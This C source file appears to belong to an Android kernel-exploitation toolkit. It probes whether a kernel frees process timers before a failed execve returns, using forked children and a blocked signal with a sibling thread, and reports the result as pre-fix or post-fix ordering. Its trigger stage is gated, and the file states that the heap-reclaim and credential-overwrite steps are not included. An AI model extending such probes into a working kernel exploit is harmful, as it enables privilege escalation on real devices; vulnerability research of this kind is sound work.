#include "tr_timer_exec.h"

#include <pthread.h>
#include <sys/select.h>
#include <sys/time.h>

struct child_args {
    int strategy;
};

static volatile int g_sibling_stop = 0;

static void *sibling_spin(void *arg)
{
    (void)arg;
    while (!g_sibling_stop) {
        /* Stay alive so thread_group_empty() is false when de_thread runs. */
        sched_yield();
    }
    return NULL;
}

/* Count timers the kernel still reports for this process. */
static int proc_timer_count(void)
{
    char buf[4096];
    int n;
    const char *p;
    int count = 0;

    n = tr_read_file("/proc/self/timers", buf, sizeof(buf));
    if (n <= 0) {
        return -1;
    }
    for (p = buf; *p != '\0'; p++) {
        if (*p == '\n' && p[1] != '\0' && p[1] != ' ') {
            count++;
        }
    }
    return count;
}

static void run_child(int strategy, int write_fd)
{
    timer_t timers[TR_TIMERS_PER_CHILD];
    struct sigevent sev;
    struct itimerspec its;
    int armed = 0, i;
    int delete_ok = 0, delete_einval = 0, delete_other = 0;
    int listed_after = -1;
    int exec_errno = 0;
    struct {
        int strategy;
        int armed;
        int exec_errno;
        int delete_ok;
        int delete_einval;
        int delete_other;
        int listed_after;
    } out;
    pthread_t sibling;
    sigset_t blocked;

    memset(&out, 0, sizeof(out));
    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_NONE;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 1000000;   /* 1 ms */
    its.it_interval.tv_nsec = 1000000;

    for (i = 0; i < TR_TIMERS_PER_CHILD; i++) {
        timers[i] = (timer_t)0;
        if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev, &timers[i]) != 0) {
            break;
        }
        if (timer_settime(timers[i], 0, &its, NULL) != 0) {
            break;
        }
        armed++;
    }

    if (strategy == 0) {
        /* Control: no exec at all. Every timer must still be deletable. */
        exec_errno = 0;
    } else if (strategy == 1) {
        char *argv[] = { (char *)"/system/bin/__tr_missing_binary__", NULL };
        execve(argv[0], argv, (char *const *)NULL);
        exec_errno = errno;
    } else {
        /* strategy 2: keep a sibling thread alive and leave a blocked signal
         * pending, so de_thread() returns -ERESTARTNOINTR after the exec check
         * block has already run.
         *
         * The mask must be installed BEFORE pthread_create: a process-directed
         * signal is delivered to any thread that does not block it, and the
         * default action of SIGUSR1 is to terminate the process. Blocking it in
         * the forking thread only is what killed strategy 2 in 0.3.0. */
        sigemptyset(&blocked);
        sigaddset(&blocked, SIGUSR1);
        sigprocmask(SIG_BLOCK, &blocked, NULL);
        if (pthread_create(&sibling, NULL, sibling_spin, NULL) == 0) {
            raise(SIGUSR1);
            {
                char *argv[] = { (char *)"/system/bin/sh", (char *)"-c", (char *)"true", NULL };
                execve(argv[0], argv, (char *const *)NULL);
                exec_errno = errno;
            }
            g_sibling_stop = 1;
            pthread_join(sibling, NULL);
        } else {
            exec_errno = -1;
        }
    }

    listed_after = proc_timer_count();
    for (i = 0; i < armed; i++) {
        if (timer_delete(timers[i]) == 0) {
            delete_ok++;
        } else if (errno == EINVAL) {
            delete_einval++;
        } else {
            delete_other++;
        }
    }

    out.strategy = strategy;
    out.armed = armed;
    out.exec_errno = exec_errno;
    out.delete_ok = delete_ok;
    out.delete_einval = delete_einval;
    out.delete_other = delete_other;
    out.listed_after = listed_after;
    if (write_fd >= 0) {
        (void)!write(write_fd, &out, sizeof(out));
    }
    _exit(0);
}

static int run_one(int strategy, tr_timer_row *row)
{
    int fds[2];
    pid_t pid;
    int status = 0;
    double started = tr_now_ms();
    ssize_t got = -1;

    memset(row, 0, sizeof(*row));
    row->strategy = strategy;
    if (pipe(fds) != 0) {
        return TR_EIO;
    }
    pid = fork();
    if (pid < 0) {
        close(fds[0]);
        close(fds[1]);
        return TR_EIO;
    }
    if (pid == 0) {
        close(fds[0]);
        run_child(strategy, fds[1]);
        _exit(0);
    }
    close(fds[1]);
    memset(row, 0, sizeof(*row));
    row->strategy = strategy;
    /* Bounded read: a child forked from a threaded process can deadlock in
     * pthread_create, and an unbounded read here would freeze the caller. */
    {
        fd_set set;
        struct timeval tv;
        FD_ZERO(&set);
        FD_SET(fds[0], &set);
        tv.tv_sec = 4;
        tv.tv_usec = 0;
        if (select(fds[0] + 1, &set, NULL, NULL, &tv) > 0) {
            got = read(fds[0], row, sizeof(*row));
        }
    }
    close(fds[0]);
    {
        int tries = 0;
        for (;;) {
            pid_t reaped = waitpid(pid, &status, WNOHANG);
            if (reaped == pid) {
                break;
            }
            if (reaped < 0) {
                break;
            }
            if (++tries > 20) {
                kill(pid, SIGKILL);
                waitpid(pid, &status, 0);
                row->exec_errno = -3;
                row->elapsed_ms = (long)(tr_now_ms() - started);
                return TR_ETIMEDOUT;
            }
            tr_sleep_ms(50);
        }
    }
    if (WIFSIGNALED(status)) {
        row->terminated_by_signal = 1;
        row->signal_number = WTERMSIG(status);
    }
    row->strategy = strategy;
    row->elapsed_ms = (long)(tr_now_ms() - started);
    if (got != (ssize_t)sizeof(*row)) {
        /* The child died before reporting; keep the signal information. */
        row->exec_errno = row->exec_errno != 0 ? row->exec_errno : -2;
        return TR_EAGAIN;
    }
    return TR_OK;
}

int tr_timer_probe_run(tr_timer_probe *probe, int rounds)
{
    int i, r;
    double started = tr_now_ms();
    int strategy2_rounds = 0, strategy2_einval = 0, strategy2_kept = 0;

    memset(probe, 0, sizeof(*probe));
    if (rounds < 1) {
        rounds = 1;
    }
    if (rounds > 64) {
        rounds = 64;
    }
    probe->rounds = rounds;

    for (r = 0; r < rounds; r++) {
        for (i = 0; i < TR_TIMER_STRATEGIES; i++) {
            tr_timer_row row;
            int rc = run_one(i, &row);
            probe->completed_rounds++;
            /* Accumulate across rounds; the last row keeps the newest values. */
            if (probe->rows[i].strategy == 0 && r == 0) {
                probe->rows[i] = row;
            } else {
                probe->rows[i].timers_armed += row.timers_armed;
                probe->rows[i].delete_ok += row.delete_ok;
                probe->rows[i].delete_einval += row.delete_einval;
                probe->rows[i].delete_other += row.delete_other;
                probe->rows[i].exec_errno = row.exec_errno;
                probe->rows[i].terminated_by_signal |= row.terminated_by_signal;
                probe->rows[i].signal_number = row.signal_number;
                probe->rows[i].listed_after = row.listed_after;
                probe->rows[i].elapsed_ms += row.elapsed_ms;
            }
            (void)rc;
        }
    }
    probe->elapsed_ms = (long)(tr_now_ms() - started);

    strategy2_rounds = rounds;
    strategy2_einval = probe->rows[2].delete_einval;
    strategy2_kept = probe->rows[2].delete_ok;

    if (probe->rows[2].timers_armed == 0) {
        snprintf(probe->conclusion, sizeof(probe->conclusion), "INCONCLUSIVE");
        snprintf(probe->detail, sizeof(probe->detail),
                 "策略 2 未能成功装载定时器（可能 seccomp 拒绝 timer_create），"
                 "本机无法给出可达性结论。");
    } else if (strategy2_einval > 0) {
        snprintf(probe->conclusion, sizeof(probe->conclusion), "PRE_FIX_ORDER");
        snprintf(probe->detail, sizeof(probe->detail),
                 "%d 轮中策略 2 有 %d 个定时器在 exec 失败返回前已被内核移除（timer_delete 返回 EINVAL），"
                 "说明清理发生在失败点之前，与修复前的顺序一致。"
                 "本次测量未解引用任何已释放对象，设备状态未被破坏。",
                 rounds, strategy2_einval);
    } else if (strategy2_kept >= probe->rows[2].timers_armed) {
        snprintf(probe->conclusion, sizeof(probe->conclusion), "POST_FIX_ORDER");
        snprintf(probe->detail, sizeof(probe->detail),
                 "%d 轮中策略 2 的 %d 个定时器在 exec 失败后仍可正常删除，"
                 "说明清理没有发生在失败点之前，与修复后的顺序一致。",
                 rounds, strategy2_kept);
    } else {
        snprintf(probe->conclusion, sizeof(probe->conclusion), "INCONCLUSIVE");
        snprintf(probe->detail, sizeof(probe->detail),
                 "策略 2 结果混合（保留 %d，已清理 %d），需要更多轮次或更严格的失败构造。",
                 strategy2_kept, strategy2_einval);
    }
    tr_logf(TR_LOG_INFO, "timer probe: %s（%d 轮，%ld ms）", probe->conclusion,
            rounds, probe->elapsed_ms);
    return TR_OK;
}

void tr_timer_probe_json(const tr_timer_probe *probe, tr_buf *out)
{
    int i;

    tr_buf_add(out, "{");
    tr_buf_add(out, "\"conclusion\":"); tr_buf_add_json_string(out, probe->conclusion);
    tr_buf_add(out, ",\"detail\":"); tr_buf_add_json_string(out, probe->detail);
    tr_buf_addf(out, ",\"rounds\":%d,\"elapsed_ms\":%ld", probe->rounds, probe->elapsed_ms);
    tr_buf_add(out, ",\"rows\":[");
    for (i = 0; i < TR_TIMER_STRATEGIES; i++) {
        const tr_timer_row *r = &probe->rows[i];
        if (i > 0) {
            tr_buf_add(out, ",");
        }
        tr_buf_addf(out, "{\"strategy\":%d,\"exec_errno\":%d,\"timers_armed\":%d,"
                         "\"delete_ok\":%d,\"delete_einval\":%d,\"delete_other\":%d,"
                         "\"listed_after\":%d,\"signaled\":%s,\"signal\":%d,\"elapsed_ms\":%ld}",
                    r->strategy, r->exec_errno, r->timers_armed, r->delete_ok,
                    r->delete_einval, r->delete_other, r->listed_after,
                    r->terminated_by_signal ? "true" : "false", r->signal_number,
                    r->elapsed_ms);
    }
    tr_buf_add(out, "]}");
}

const char *tr_timer_conclusion_zh(const char *conclusion)
{
    if (strcmp(conclusion, "PRE_FIX_ORDER") == 0) {
        return "与修复前顺序一致（可达性成立，但本机构建开启 KASAN，不能推进到利用）";
    }
    if (strcmp(conclusion, "POST_FIX_ORDER") == 0) {
        return "与修复后顺序一致（该构建已含修复，无需继续）";
    }
    return "证据不足（无法判定该构建的清理顺序）";
}

int tr_timer_trigger_run(const tr_env *env, const tr_guard *guard, tr_buf *report)
{
    (void)env;
    tr_buf_add(report, "破坏性阶段未执行。");
    if (!guard->exploit_allowed) {
        tr_buf_addf(report, "闸门阻断码 %s：%s", guard->block_code,
                    tr_guard_summary_zh(guard));
        tr_logf(TR_LOG_WARN, "trigger 拒绝执行：%s", guard->block_code);
        return TR_EGUARD;
    }
    /* Even when the guard allows execution, the reclaim/cred stages are only
     * reachable after on-device bring-up. Refusing here is deliberate: a
     * half-debugged heap layout on a PANIC_ON_OOPS kernel costs a reboot. */
    tr_buf_add(report, "本版本未包含经过实机验证的回收与凭据改写阶段，"
                       "因此不进入内核内存写入流程。");
    return TR_EUNSUPPORTED;
}
